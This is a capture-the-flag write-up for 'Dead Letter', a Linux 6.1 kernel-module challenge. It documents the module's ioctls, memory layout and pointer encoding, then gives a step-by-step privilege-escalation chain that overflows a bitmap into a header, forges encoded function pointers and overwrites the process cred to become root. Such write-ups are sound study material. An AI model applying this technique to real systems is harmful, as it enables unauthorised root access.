Dead Letter is a Linux 6.1 kernel-module challenge. The module /dev/deadletter keeps all of its state on one zeroed page and exposes three ioctls. The bitmap ioctl can set arbitrary bits in page+0x100..0x1ff, which overlaps the header at page+0x180. Setting bit 12 of header[8] raises the body access bound from 0x100 to 0x1100, turning the "read/write body" ioctl into a read/write primitive over the slot table and the sealed "letter".

The page can then be parsed to recover the active slot, the per-open keys and the encoded pointers (module base, current->cred). The "send" ioctl authenticates a slot and calls the decoded slot[0x10] pointer with rdi = ctx, so we can invoke the module's own gate functions in sequence:

  1. 0x120 validates the letter/slot and caches current->cred into ctx[0x38];
  2. 0x2b0 sets header[0x10] = current->cred, so the body-write ioctl now writes to our cred.

Finally we overwrite cred->uid/gid/... with zero and grant full capabilities, then read /flag as root.

docs.text:
open() (.text+0xe60):

  • ctx = kmalloc(0x58, GFP_KERNEL | __GFP_ZERO) (0xdc0 flags)
  • one zeroed page page = get_zeroed_page()
  • ctx[0x00] = page
  • ctx[0x08] = page+0x200
  • ctx[0x10] = page+0x100
  • ctx[0x18] = page+0x180
  • ctx[0x20] = page+0xc00
  • ctx[0x28] = <random active slot>

Page layout:

page+0x100  bitmap (0x80 bytes)     <-- bts target
page+0x180  header (0x80 bytes)     <-- overlaps the bitmap!
              +0x00  "deadlett" ^ handle
              +0x08  u64 bound/flags  (initial 0x00000003_00000100)
              +0x10  pointer to body (page+0x200)
page+0x200  body    (0x100 bytes)
page+0x400  9 slots, 0x80 bytes each
page+0xc00  letter, 0x80 bytes

Each slot is seeded with two random u32 values C = slot[0x30], A = slot[0x34] = mix(C), B = slot[0x38] = hash32(C), and a random 64-bit handle H = slot[0x08] = (u64)C<<32 | A. The slot also contains slot[0x20] = page, slot[0x28] = page+0x200 and several encoded 64-bit pointers:

key1 = A*0x100000001 ^ H ^ 0xd1ceb00bcafebeef
key2 = A*0x100000001 ^ rol64(B,0x1d) ^ H ^ 0xa3a1c57fafd3c8dd

enc(key, fn) = rol64(key+fn, 0x11) ^ ror64(key, 0x0b)
fn          = ror64(enc ^ ror64(key,0x0b), 0x11) - key

At open() the letter is built from the active slot and encodes, among other things, current and current->cred (task_struct->cred is at offset 0xb90 in this kernel).

• 0x40084b40 — {u16 idx; u16 0; u32 0} → bts [page+0x100], idx, idx <= 0x7ff. This is the bug: idx up to 0x7ff reaches page+0x1ff, i.e. the header.
  • 0x40184b41 — {u32 off; u32 len; u64 buf; u32 mode; u32 flags}
  • mode 0: copy_to_user(buf, header[0x10]+off, len)
  • mode 1: copy_from_user(buf, len); memcpy(header[0x10]+off, buf, len)
  • mode 2: copy_to_user(buf, ctx[0x38]+off, len), bounded by ctx[0x40]

  • 0xc0184b42 — {u64 handle; u64 token; u64 result}: finds a slot with slot[8] == handle, requires it to be the active slot ctx[0x28], verifies the token token = rol32(A,7) ^ A ^ B ^ 0x73656e64 ("send"), verifies a large set of invariants (including slot[0x48] == hash_slot(slot)), then decodes slot[0x10] and calls it with rdi = ctx. The function return value is written to slot[0x40] and to result.

• .text+0x120 validates the letter and slot, checks that the decoded letter[0x40] equals current->cred, then stores ctx[0x38] = current->cred, ctx[0x40] = 0x100, ctx[0x48] = ... and updates slot[0x3c]. This enables the mode-2 read window over cred.
  • .text+0x2b0 requires the state produced by 0x120, then sets header[0x10] = current->cred, header[8] = 0x100, header[0xc] = 0x80000003. This turns mode 1 into an arbitrary write into cred.

docs.title: Exploit chain
docs.text:
1. set_bit(0x44c) sets bit 12 of header[8] (0x100 -> 0x1100). This both raises the body bound enough to reach the slots/letter and makes the qword at header+8 exactly 0x00000003_000001100, which 0x120 checks.
  2. Mode 0 dump of page+0x200 .. page+0x1000 recovers all slots and the letter.
  3. letter[0x20] is the handle of the active slot; matching it against each slot[8] identifies the active slot index (the active slot is random).
  4. key1, key2 are recomputed from A, B, H. Decoding slot[0x18] yields the module base; decoding letter[0x40] yields current->cred.
  5. We modify the letter: letter[0x18] = H ^ 0x7374616765312121 so that 0x2b0's check on ctx[0x30] (zeroed by __GFP_ZERO) passes, then recompute the two letter hashes (func0 at .text+0x0, func70 at .text+0x70) and store them at letter[0x28] / letter[0x68].
  6. Craft the active slot: keep all authenticated fields, set slot[0x10] = enc(key1, .text+0x120), slot[0x3c] to the "FAST" check value, slot[0x40] = cred, and recompute slot[0x48] = hash_slot(slot). Send with the correct token → 0x120 runs, caching cred.
  7. Read cred via mode 2. Craft the slot again with slot[0x10] = enc(key1, .text+0x2b0), the new slot[0x3c] ("COMM"), slot[0x40] = cred, recompute the hash, send again → 0x2b0 sets header[0x10] = cred.
  8. Mode 1 write of a patched cred buffer: all uids/gids = 0 and cap_permitted/effective/bset/ambient = 0x1ffffffffff.
  9. getuid() now returns 0 and /flag is readable.
